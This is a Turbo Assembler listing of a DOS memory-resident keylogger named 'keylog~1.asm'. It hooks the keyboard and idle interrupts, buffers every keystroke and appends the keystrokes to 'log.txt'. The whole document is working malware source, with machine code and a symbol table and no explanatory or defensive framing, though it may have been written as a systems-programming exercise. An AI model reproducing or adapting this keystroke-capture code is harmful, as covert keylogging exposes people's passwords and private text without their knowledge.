Turbo Assembler	 Version 4.1	    05/16/20 18:55:12	    Page 1
keylog~1.asm



      1				     .186
      2	0000			     .model tiny
      3	0000			     .code
      4				     org 100h
      5				     locals @@
      6
      7	0100			     Start:
      8	0100  FA				     cli
      9
     10					     ;counting addr of int 9h
     11	0101  BB 0024				     mov bx, 9h	* 4h
     12	0104  33 C0				     xor ax, ax
     13	0106  8E C0				     mov es, ax
     14
     15
     16					     ;saving addr of old 9h
     17	0108  26: 8B 07				     mov ax, word ptr es:[bx]
     18	010B  A3 016Ar				     mov word ptr old_9h_o, ax		     ;offset
     19
     20	010E  26: 8B 47	02			     mov ax, word ptr es:[bx + 2]
     21	0112  A3 016Cr				     mov word ptr old_9h_s, ax		     ;segment
     22
     23
     24					     ;rewriting	addr of	old 9h to new 9h in memory
     25	0115  B8 2509				     mov ax, 2509h
     26	0118  BA 015Ar				     mov dx, offset new_9h
     27	011B  CD 21				     int 21h
     28
     29
     30					     ;counting addr of int 28h
     31	011D  BB 00A0				     mov bx, 28h * 4h
     32	0120  33 C0				     xor ax, ax
     33	0122  8E C0				     mov es, ax
     34
     35					     ;saving addr of old 28h
     36	0124  26: 8B 07				     mov ax, word ptr es:[bx]
     37	0127  A3 0156r				     mov word ptr old_28h_o, ax
     38
     39	012A  26: 8B 47	02			     mov ax, word ptr es:[bx + 2]
     40	012E  A3 0158r				     mov word ptr old_28h_s, ax
     41
     42
     43					     ;rewriting	addr of	old 28h	to new 28h in memory
     44	0131  B8 2528				     mov ax, 2528h
     45	0134  BA 0146r				     mov dx, offset new_28h
     46	0137  CD 21				     int 21h
     47
     48	0139  FB				     sti
     49
     50					     ;staying resident in memory
     51	013A  B8 3100				     mov ax, 3100h;
     52	013D  BA 02E4r				     mov dx, offset end_label
     53	0140  C1 EA 04				     shr dx, 4
     54	0143  42				     inc dx
     55	0144  CD 21				     int 21h;
     56
     57
Turbo Assembler	 Version 4.1	    05/16/20 18:55:12	    Page 2
keylog~1.asm



     58	0146			     new_28h proc
     59	0146  60				     pusha
     60	0147  06 1E				     push es ds
     61
     62	0149  E8 003B				     call flush_buff
     63
     64	014C  1F 07				     pop ds es
     65	014E  61				     popa
     66
     67					     ;call original int	28h
     68	014F  9C				     pushf
     69	0150  2E: FF 1E	0156r			     call dword	ptr cs:[old_28h_o]
     70
     71	0155  CF				     iret
     72	0156					     endp
     73
     74	0156  0000		     old_28h_o dw 0h
     75	0158  0000		     old_28h_s dw 0h
     76
     77
     78	015A			     new_9h proc
     79	015A  60				     pusha
     80	015B  06 1E				     push es ds
     81
     82					     ;call original int	9h
     83	015D  9C				     pushf
     84	015E  2E: FF 1E	016Ar			     call dword	ptr cs:[old_9h_o]
     85
     86	0163  E8 0008				     call read_to_buff
     87
     88	0166  1F 07				     pop ds es
     89	0168  61				     popa
     90
     91	0169  CF				     iret
     92	016A					     endp
     93
     94
     95	016A  0000		     old_9h_o dw 0h
     96	016C  0000		     old_9h_s dw 0h
     97
     98
     99
    100	016E			     read_to_buff proc
    101
    102	016E  1E				     push ds
    103	016F  0E				     push cs
    104	0170  1F				     pop ds
    105
    106					     ;saving pressed key
    107	0171  B4 01				     mov ah, 01h
    108	0173  CD 16				     int 16h
    109
    110	0175  74 0E				     jz	@@exit
    111
    112					     ;setting bx as len
    113	0177  8A 1E 01E3r			     mov bl, tail_ind
    114	017B  32 FF				     xor bh, bh
Turbo Assembler	 Version 4.1	    05/16/20 18:55:12	    Page 3
keylog~1.asm



    115
    116					     ;saving key to buff
    117	017D  88 87 01E4r			     mov buff[bx], al
    118	0181  FE 06 01E3r			     inc tail_ind
    119
    120
    121	0185			     @@exit:
    122
    123	0185  1F				     pop ds
    124
    125	0186  C3				     ret
    126	0187					     endp
    127
    128
    129	0187			     flush_buff	proc
    130
    131
    132	0187  1E				     push ds
    133	0188  0E				     push cs
    134	0189  1F				     pop ds
    135
    136	018A  2E: 8A 0E	01E3r			     mov cl, cs:tail_ind
    137	018F  32 ED				     xor ch, ch
    138
    139						     ;cmp head_ind, cl
    140						     ;je @@exit
    141
    142	0191  51				     push cx
    143
    144						     ;mov cl, tail_ind
    145					     ;opening file by adress in	ds:dx and saving its handler
    146	0192  B8 3D01				     mov ax, 3d01h;
    147	0195  BA 01D7r				     mov dx, offset log_file;
    148	0198  CD 21				     int 21h
    149	019A  A3 01DFr				     mov file_handler, ax
    150
    151
    152					     ;moving cursor to the end of file
    153	019D  B8 4202				     mov ax, 4202h
    154	01A0  8B 1E 01DFr			     mov bx, file_handler
    155	01A4  33 C9				     xor cx, cx
    156	01A6  33 D2				     xor dx, dx
    157	01A8  CD 21				     int 21h
    158
    159				     ;!!!
    160	01AA  A0 01E1r				     mov al, head_ind
    161	01AD  32 E4				     xor ah, ah
    162	01AF  BA 01E4r				     mov dx, offset buff
    163	01B2  03 D0				     add dx, ax
    164
    165	01B4  59				     pop cx
    166					     ;writing to file
    167	01B5  B4 40				     mov ah, 40h
    168	01B7  8B 1E 01DFr			     mov bx, file_handler
    169	01BB  2A 0E 01E1r			     sub cl, head_ind
    170	01BF  32 ED				     xor ch, ch
    171				     ;		     mov dx, offset buff
Turbo Assembler	 Version 4.1	    05/16/20 18:55:12	    Page 4
keylog~1.asm



    172				     ;		     add dx, head_ind
    173	01C1  CD 21				     int 21h
    174
    175	01C3  02 0E 01E1r			     add cl, head_ind
    176	01C7  32 ED				     xor ch, ch
    177	01C9  88 0E 01E1r			     mov head_ind, cl
    178
    179					     ;closing file
    180	01CD  B4 3E				     mov ah, 3eh
    181	01CF  8B 1E 01DFr			     mov bx, file_handler
    182	01D3  CD 21				     int 21h
    183
    184	01D5			     @@exit:
    185	01D5  1F				     pop ds
    186	01D6  C3				     ret
    187	01D7					     endp
    188
    189
    190	01D7  6C 6F 67 2E 74 78	74+  log_file db 'log.txt', 0
    191	      00
    192	01DF  ????		     file_handler dw ?
    193
    194	01E1  00		     head_ind db 0d
    195	01E2  00		     mutex db 0
    196	01E3  00		     tail_ind db 0d
    197
    198	01E4  0100*(00)		     buff db 256d dup (0h)
    199
    200
    201
    202
    203	02E4			     end_label:
    204				     end Start
Turbo Assembler	 Version 4.1	    05/16/20 18:55:12	    Page 5
Symbol Table




Symbol Name			  Type	 Value

??DATE				  Text	 "05/16/20"
??FILENAME			  Text	 "keylog~1"
??TIME				  Text	 "18:55:12"
??VERSION			  Number 040A
@32BIT				  Text	 0
@@EXIT				  Near	 DGROUP:0185
@@EXIT				  Near	 DGROUP:01D5
@CODE				  Text	 DGROUP
@CODESIZE			  Text	 0
@CPU				  Text	 0103H
@CURSEG				  Text	 _TEXT
@DATA				  Text	 DGROUP
@DATASIZE			  Text	 0
@FILENAME			  Text	 KEYLOG~1
@INTERFACE			  Text	 000H
@MODEL				  Text	 1
@STACK				  Text	 DGROUP
@WORDSIZE			  Text	 2
BUFF				  Byte	 DGROUP:01E4
END_LABEL			  Near	 DGROUP:02E4
FILE_HANDLER			  Word	 DGROUP:01DF
FLUSH_BUFF			  Near	 DGROUP:0187
HEAD_IND			  Byte	 DGROUP:01E1
LOG_FILE			  Byte	 DGROUP:01D7
MUTEX				  Byte	 DGROUP:01E2
NEW_28H				  Near	 DGROUP:0146
NEW_9H				  Near	 DGROUP:015A
OLD_28H_O			  Word	 DGROUP:0156
OLD_28H_S			  Word	 DGROUP:0158
OLD_9H_O			  Word	 DGROUP:016A
OLD_9H_S			  Word	 DGROUP:016C
READ_TO_BUFF			  Near	 DGROUP:016E
START				  Near	 DGROUP:0100
TAIL_IND			  Byte	 DGROUP:01E3

Groups & Segments		  Bit Size Align  Combine Class

DGROUP				  Group
  _DATA				  16  0000 Word	  Public  DATA
  _TEXT				  16  02E4 Word	  Public  CODE
